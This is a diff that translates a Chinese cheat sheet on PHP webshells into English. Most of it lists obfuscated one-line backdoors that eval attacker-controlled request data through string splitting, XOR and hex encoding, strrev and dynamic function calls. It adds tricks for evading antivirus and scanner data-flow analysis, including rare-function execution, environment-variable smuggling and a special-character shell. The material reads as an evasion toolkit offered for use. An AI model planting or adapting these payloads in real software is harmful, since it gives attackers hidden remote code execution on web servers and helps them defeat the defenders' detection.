@@ -1,60 +1,60 @@
 WebShell
 ================================
 
-常见变形
+Common deformations
 --------------------------------
 - GLOBALS
     - ``eval($GLOBALS['_POST']['op']);``
 - ``$_FILE``
     - ``eval($_FILE['name']);``
-- 拆分
+- Split
     - ``eval(${"_PO"."ST"} ['sz']);``
-- 动态函数执行
+- Dynamic function execution
     - ``$k="ass"."ert"; $k(${"_PO"."ST"} ['sz']);``
     - ``$a=$_GET['a'];$a($_GET['b']);``
 - create_function
     - ``$function = create_function('$code',strrev('lave').'('.strrev('TEG_$').'["code"]);');$function();``
 - preg_replace
-- 变形
+- Transformation
     - str_replace(" ", "e v a l")
-- 进制转化
+- Base conversion
     - ``"\x62\x61\163\x65\x36\x34\137\144\145\x63\x6f\144\145"``
-- 进制运算
+- Base arithmetic
     - ``("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");``
-- 自增运算
+- Increment operation
     - ``$a="a";$a++;``
-- 强制类型转换
+- Forced type conversion
     - ``$a='';$a.=[]; // Array``
-- 利用文件名
+- Utilize file names
     - ``__FILE__``
-- 注释
+- Comments
     - ``$a="e"."v"./*-/*-*/"a"./*-*/"l";``
-- 反射
+- reflection
     - ``ReflectionFunction``
 
 Bypass
 --------------------------------
-- 基于少见函数
+- Based on rare functions
     - ``mb_eregi_replace('.*',$_GET[1],'','e');``
     - set_error_handler + trigger_error
-- 基于污染传播
+- Spread based on contamination
     - ``putenv($_GET["c"]);eval(getenv('path'));``
     - parse_str
     - parse_url
     - extract
     - token_get_all
     - define
-- 基于少见源
+- Based on rare sources
     - ``$a = filter_input(INPUT_GET,'c');``
     - ``eval(end(getallheaders()));``
     - get_defined_vars
     - getallheaders
     - get_meta_tags
     - phpinfo
-    - 外部变量 / 文件信息
-    - 重载 toString
+    - External variables/file information
+    - Overload toString
 
-字符串变形函数
+String transformation function
 --------------------------------
 - base64_decode
 - base64_encode
@@ -70,7 +70,7 @@ Bypass
 - ucfirst
 - ucwords
 
-回调函数
+callback function
 --------------------------------
 - array_filter
 - array_map
@@ -88,20 +88,20 @@ Bypass
 - uasort
 - uksort
 
-加解密函数
+Encryption and decryption functions
 --------------------------------
 - mcrypt_encrypt
 - openssl_encrypt
 
-其他执行方式
+Other execution methods
 --------------------------------
 - FFI
 - SimpleXML
 - SimpleXMLElement
 
-自定义函数
+Custom function
 --------------------------------
-使用自定义的加解密函数，在一定程度上可以绕过一些防护软件的查杀，下面的代码是一个基于十六进制的执行的简单例子。
+Using custom encryption and decryption functions can bypass some protection software to a certain extent. The following code is a simple example of hexadecimal-based execution.
 
 .. code:: php
 
@@ -115,9 +115,9 @@ Bypass
     }
     eval($string);
 
-特殊字符Shell
+Special characters Shell
 --------------------------------
-PHP的字符串可以在进行异或、自增运算的时候，会直接进行运算，故可以使用特殊字符来构成Shell。
+PHP strings can be directly operated when performing XOR and auto-increment operations, so special characters can be used to form a Shell.
 
 .. code:: php
 
@@ -166,10 +166,10 @@ PHP的字符串可以在进行异或、自增运算的时候，会直接进行�
     $_=$$____;
     $___(base64_decode($_[_]));
 
-检测对抗
+detection confrontation
 --------------------------------
-- 基于混淆影响程序分析
-- 基于动态变量影响程序执行
-- 抛出异常打断数据流分析
-- 基于反射打断数据流分析
-- 基于引用传递打断数据流分析
+- Program analysis based on confusion impact
+- Influence program execution based on dynamic variables
+- Throw exceptions to interrupt data flow analysis
+- Interrupt data flow analysis based on reflection
+- Interrupt data flow analysis based on reference passing
